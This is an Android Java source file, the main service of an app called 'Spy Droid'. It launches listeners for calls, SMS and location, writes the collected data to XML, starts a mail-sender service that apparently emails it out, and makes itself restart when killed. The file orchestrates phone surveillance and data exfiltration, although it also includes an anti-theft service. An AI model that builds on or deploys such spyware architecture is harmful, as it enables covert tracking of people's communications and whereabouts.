package com.innolabs.spydroid;


import android.app.Service;
import android.content.Intent;
import android.os.IBinder;
import android.util.Log;

/**
 * Main Service is a Android service to start all other Services of the application
 * 
 * @author Srikanth Rao
 *
 *@see android.app.Service
 */
public class MainService extends Service {

	/** String value to show the TAG for the activity in the LOG CAT */
	public static String MAINSERVICE_TAG = "SPY DROID - MAIN SERVICE";
	
	/**
	 * Method that starts as soon as the Main service is started.
	 * 
	 * This method is used to start the Calls Listener, SMS Listener, Location Listener, DataBase to XML Writer and Mail Sender service
	 * 
	 * @see android.app.Service#onStartCommand(Intent, int, int)
	 * 
	 * @return The Intent, Flags and startId which was sent as arguments
	 */	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {

		Log.v("", "Main Service Started...");
		
		// Creating New Thread
		new Thread()
		{
			
			/**
			 * Run is the default method which executes when a thread is initiated or created
			 * 
			 * @see java.lang.Thread.run()
			 */
			@Override
			public void run() {

				super.run();
				
				Log.v(MAINSERVICE_TAG, "New Thread Created");

				// Starting Call Listener Service
				Intent callsIntent = new Intent(MainService.this, CallListeners.class);
				Log.v(MAINSERVICE_TAG, "Starting Call Listerner Service");
				startService(callsIntent);
				
				
				// Starting Location Listener Service
				Intent locationIntent = new Intent(MainService.this, LocationsListener.class);
				Log.v(MAINSERVICE_TAG, "Starting Location Listerner Service");
				startService(locationIntent);
				
				
				// Starting SMS Listener Service
				Intent smsIntent = new Intent(MainService.this, SMSListeners.class);
				Log.v(MAINSERVICE_TAG, "Starting SMS Listerner Service");
				startService(smsIntent);
				
				// Sleeping the Thread for 15 seconds
				try {
					
					Log.v(MAINSERVICE_TAG, "Sleeping Thread for 15 seconds");
					
					sleep(15*1000);
					
				} catch (InterruptedException e) {

					// Printing the Exceptions
					e.printStackTrace();
				}
				
				// Starting Write Database to XML Service
				Intent writeFilesIntent = new Intent(MainService.this, WriteDataBasetoXML.class);
				Log.v(MAINSERVICE_TAG, "Starting Write Database to XML Service");
				startService(writeFilesIntent);
				
				// Sleeping for 30 seconds
				try {
					
					Log.v(MAINSERVICE_TAG, "Sleeping Thread for 30 seconds");
					
					sleep(30*1000);

				} catch (InterruptedException e) {

					// Printing the Exceptions
					e.printStackTrace();
				}
				
				// Starting Spy Droid Mail Sender Service
				Intent mailSendingIntent = new Intent(MainService.this, SpyDroidMailSenderService.class);
				Log.v(MAINSERVICE_TAG, "Starting Spy Droid Mail Sender Service");
				startService(mailSendingIntent);
				
				// Starting Anti Theft Service
				Intent antiTheftIntent = new Intent(MainService.this, AntiTheftService.class);
				Log.v(MAINSERVICE_TAG, "Starting Anti Theft Service");
				startService(antiTheftIntent);			
				
			}
		}.start(); // Starting the Thread

		Log.v(MAINSERVICE_TAG, "Returning Sticky Intent which lasts long and starts itself when Android System stops the Service for Memory heap problem or any other Crash");
		
		// Returning START_STICKY - Giving Ability for the service to start itself even if it was stopped or crashed by the Android System
		return START_STICKY;
	}

	/** Method called when BindService is called from other instance
	 * 
	 * @param intent The Intent from which the method was called
	 * 
	 * @return null Noting is sent back to the bindService method
	 * 
	 * @see android.app.Service#onBind(Intent)
	 */
	@Override
	public IBinder onBind(Intent intent) {


		return null;
	}



}
